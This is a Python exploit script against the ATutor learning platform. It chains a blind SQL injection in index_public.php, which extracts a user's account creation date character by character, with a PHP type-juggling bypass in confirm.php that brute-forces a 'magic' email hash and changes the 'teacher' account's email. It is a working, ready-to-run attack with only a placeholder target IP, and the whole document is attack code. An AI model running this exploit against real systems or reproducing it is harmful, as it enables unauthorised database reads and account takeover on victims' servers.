# Developed by : Alaa (aka b1tByte)
import requests 
import hashlib
from termcolor import colored
import random, string
import re 

# To-Do :
	# 1 - Get the creation_date from the DB ==> using the blind sqli ================> DONE 
	# 2 - Find a Magic E-Mail address ========> brute-forcing =======================> DONE
	# 3 - Update the user email ==============> using the PHP Type Juggling =========> DONE


class TypeJuggling:
	targetIP = "x.x.x.x" # update this
	vulnerableFunction = "http://"+targetIP+"/ATutor/mods/_standard/social/index_public.php?q="
	updateEmailFunction = "http://"+targetIP+"/ATutor/confirm.php"
	dateChars = "1234567890:- "
	emailDomain = "@domain.com" # update this

	def __init__ (self,maxDateLength,username,tableName):
		self.username = username
		self.tableName = tableName
		self.maxDateLength = maxDateLength
		self.creationDate = "" 


	# ---------------------------------------------------------------------------------------- #
	# This function replaces spaces within the query with mysql spaces /**/                    #
	# ---------------------------------------------------------------------------------------- #
	def replaceSpaces(self,query):
		wellFormedQuery = query.replace(" ","/**/")
		return wellFormedQuery;
	############################################################################################

	# ---------------------------------------------------------------------------------------- #
	# This function builds the blind sql query for getting the creation_date field value       #
	# ---------------------------------------------------------------------------------------- #
	def getCreationDateQuery(self,username,char,charIndex,tableName):
		query = "test') or (SELECT ascii(substr(creation_date," + str(charIndex) + ",1)) FROM " + str(tableName) + " WHERE login = '" + str(username) + "') = ascii('" + str(char) + "')" + " %23"
		query = self.replaceSpaces(query)
		return query
	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function retrieves the creation_date value                                          #
	# ---------------------------------------------------------------------------------------- #
	def getCreationDate(self):
		print(colored("[i] Retrieving creation_date field value","yellow"))
		i = 1
		while i <= self.maxDateLength:
			for char in self.dateChars:
				response = requests.get(self.vulnerableFunction + self.getCreationDateQuery(self.username,char,i,self.tableName))
				length = int(response.headers['Content-Length'])
				case = self.BlindSQLiCases(length)
				#print(response.request.url)
				#print(length)
				if case:
					print(colored("[+] Found char %s at index %d" %(char,i),"green"))
					self.creationDate += char
					break
			i +=1
		# adding a space to the date to match the mysql date syntax 
		index = 10
		self.creationDate = self.creationDate[:index] + " " + self.creationDate[index:]
		return self
	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function returns a random string                                                    #
	# ---------------------------------------------------------------------------------------- #
	def randomWord(self,length):
		letters = string.ascii_lowercase
		return ''.join(random.choice(letters) for i in range(length))
	############################################################################################


	# ---------------------------------------------------------------------------------------------------------------- #
	# This function create the magic email                                                                             #
	#  - The loose comparision equation in the code is : $code == $m                                                   #
	#  - We can control $m variable from the GET request , and we will pass 0 value into it                            #
	#  - The $code is equal to : $code = substr(md5($e . $row['creation_date'] . $id), 0, 10);                         #
	#      - We can control $e and $id from the GET request 								                                           #
	#      - We can get the creation_date value from the DB using the blind sqli                    				           #
	#      - Then we will concatinate $e & creation_date & $id 										                                     #
	#      - Then we apply the md5 and extract the 10 chars            				                                         #
	#      - Brute force step: then we need to search for an md5 result that match the 0eDDDDDDDD where “D” is a digit #
	# ---------------------------------------------------------------------------------------------------------------- #
	def magicEmail(self):
		print(colored("[i] Brute-Forcing a magic email value","yellow"))
		magicMail = False 
		while not magicMail:
			username = self.randomWord(5)
			e = username + self.emailDomain
			userId = 1 
			md5Result = str(e) + str(self.creationDate) + str(userId)
			md5Result = hashlib.md5(md5Result.encode('utf-8')).hexdigest()
			# get the first 10 chars
			md5Result = md5Result[:10]
			pattern = "0+[eE]+[0-9]+$"
			# check for the match : 0eDDDDDDDD, where “D” is a digit
			if re.match(pattern, md5Result):
				print(colored("[++] Found a magic email %s: " %(e),"cyan"))
				print (colored("[++] Equivalent loose comparison: %s == 0" %(md5Result),"cyan"))
				magicMail = True
		return e 

	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function update the user email using the magic email                                #
	# ---------------------------------------------------------------------------------------- #
	def updateEmail(self):
		e = self.magicEmail()
		userId = 1
		param = "?e=" + str(e) + "&id=" + str(userId) + "&m=0"
		print(colored("[i] Trying to update the email with the magic email: %s" %(e),"yellow"))
		response = requests.get(self.updateEmailFunction+param,allow_redirects=False)
		if (response.status_code == 302):
			print(colored("[++] Email updated successfully!!","cyan"))
	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function test Blind SQLi cases                            				                   #
	# Atutor Blind SQLi Cases : 		     								                                       #
	#         1 - False : Content-Length is equal to 20 bytes                                  #
	#         2 - True :  Content-Length is greater than 20 bytes                              #
	# ---------------------------------------------------------------------------------------- #
	def BlindSQLiCases(self,length):
		case = False
		if (length > 20):
			case = True
		return case
	############################################################################################





username = "teacher"
tableName = "AT_members"
obj = TypeJuggling(25,username,tableName);
obj.getCreationDate()
print(colored("[++] creation_date for user %s is %s" %(username,obj.creationDate),"cyan"))
obj.updateEmail()


